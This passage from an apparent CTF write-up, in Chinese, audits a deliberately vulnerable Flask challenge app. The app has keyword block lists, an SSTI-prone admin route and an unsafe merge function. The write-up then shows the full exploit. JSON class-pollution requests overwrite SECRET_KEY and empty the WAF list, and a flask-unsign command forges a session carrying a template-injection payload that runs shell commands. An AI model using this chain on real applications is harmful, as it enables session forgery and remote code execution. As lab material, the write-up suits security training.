    if session.get('name') == "admin" and session.get('permission') != 0:
        permission = session.get('permission')
        if check1(permission):
            # 检测添加的商品是否合法
            return "非法权限"

        if request.method == 'POST':
            return '<script>alert("上传成功！");window.location.href="/aaadminnn";</script>'

        upload_form = '''
        <h2>商品管理系统</h2>
        <form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc">
            <h3>上传新商品</h3>
            <input type=file name=file required style="margin:10px"><br>
            <small>支持格式：jpg/png（最大2MB）</small><br>
            <input type=submit value="立即上传" style="margin:10px;padding:5px 20px">
        </form>
        '''

        original_template = 'Hello admin!!!Your permissions are{}'.format(permission)
        new_template = original_template + upload_form

        return render_template_string(new_template)
    else:
        return "<script>alert('You are not an admin');window.location.href='/'</script>"




def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def check(raw_data, forbidden_keywords=None):
    """
    检查原始数据中是否包含禁止的关键词
    如果包含禁止关键词返回 True，否则返回 False
    """
    # 设置默认禁止关键词
    if forbidden_keywords is None:
        forbidden_keywords = ["app", "config", "init", "globals", "flag", "SECRET", "pardir", "class", "mro", "subclasses", "builtins", "eval", "os", "open", "file", "import", "cat", "ls", "/", "base", "url", "read"]

    # 检查是否包含任何禁止关键词
    return any(keyword in raw_data for keyword in forbidden_keywords)


param_black_list = ['config', 'session', 'url', '\\', '<', '>', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',
                    'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',
                    'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]


# 增强WAF防护
def waf_check(value):
    # 检查是否有不合法的字符
    for black in param_black_list:
        if black in value:
            return False
    return True

# 检查是否是自动化工具请求
def is_automated_request():
    user_agent = request.headers.get('User-Agent', '').lower()
    # 如果是常见的自动化工具的 User-Agent，返回 True
    automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider']
    return any(agent in user_agent for agent in automated_agents)

def check1(value):

    if is_automated_request():
        print("Automated tool detected")
        return True

    # 使用WAF机制检查请求的合法性
    if not waf_check(value):
        return True

    return False


app.run(host="0.0.0.0",port=5014)
```

审计一下源码就可以看到/aaadminnn路由可以ssti

注入点是session中的permission参数

那我们先污染一手SECRET_KEY，然后伪造session

```http
POST /add HTTP/1.1
Host: 27.25.151.198:30362
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Referer: http://27.25.151.198:30362/add
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Origin: http://27.25.151.198:30362
Accept: */*
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Content-Length: 3

{"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F":{"\u0061\u0070\u0070":{"\u0063\u006F\u006E\u0066\u0069\u0067":{"\u0053\u0045\u0043\u0052\u0045\u0054\u005F\u004B\u0045\u0059":"xrntkk"}}}}
```

另外把waf污染为空

```http
POST /add HTTP/1.1
Host: 27.25.151.198:30362
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Referer: http://27.25.151.198:30362/add
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Origin: http://27.25.151.198:30362
Accept: */*
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Content-Length: 3

{"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F":{"param_black_list":""}}
```

Payload:

```shell
┌──(root㉿XrntsPC)-[/home/xrntkk/flask-session-cookie-manager]
└─# flask-unsign --sign --secret xrntkk -c '{"name":"admin","permission":"{{g.pop.__globals__.__builtins__[\"__import__\"](\"os\").popen(\"cat 4flloog\").read()}}"}'
.eJwVi8EKwyAQBX-lvFMCIaee-is1LKaxsrDuitqT-O81t5mB6VCfAl7wV2LFhhxK4lrZdMbe454t70RR7PRSiSafP5bGOuXtQMQpW2lEDsfiYNVhvaeg0z6-PZ5fEbN45xL8taxjYPwBAIEp0w.aEP1oA.brg9-lSD1jUcXaCB0RD1A8erqZI
```

![image-20250608222842841](../assets/image-20250608222842841.png)